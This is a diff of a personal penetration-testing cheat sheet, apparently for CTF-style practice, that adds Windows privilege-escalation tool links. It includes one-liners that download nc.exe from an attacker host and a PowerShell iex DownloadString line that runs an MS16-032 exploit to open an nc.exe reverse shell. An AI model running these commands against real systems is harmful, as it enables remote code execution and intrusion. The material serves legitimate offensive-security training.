@@ -52,6 +52,7 @@
 - sqlmap
 
 ## Windows
+- [Good advices](https://nored0x.github.io/red-teaming/windows-enumeration/)
 - whoami /priv
 - systeminfo
 - smb read/write
@@ -65,12 +66,20 @@
 - Check loggings
   - sysmon enable / powershell loggging enabled ?
 - echo %VARIABLE%
+  - PATH $Env:PATH
 - Unquoted services:
   - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
 - Permissions:
   - icalcs
 - eventvwr
 - RCE admin: change user
+- **Automatic scans**
+  - winpeas
+  - [privesc_check](https://github.com/pentestmonkey/windows-privesc-check)
+  - [powerup](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
+  - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
+  - Empire modules:  /usr/share/powershell-empire/empire/server/modules/
+
   
 ### Registry
 - Passwords:
@@ -129,7 +138,7 @@
 - powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
 - powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
 - certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
-- iex (New-Object Net.WebClient).DownloadString('http://$attacking/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
+- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-MS16032.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
      __ __ ___ ___   ___     ___ ___ ___ 
     |
 
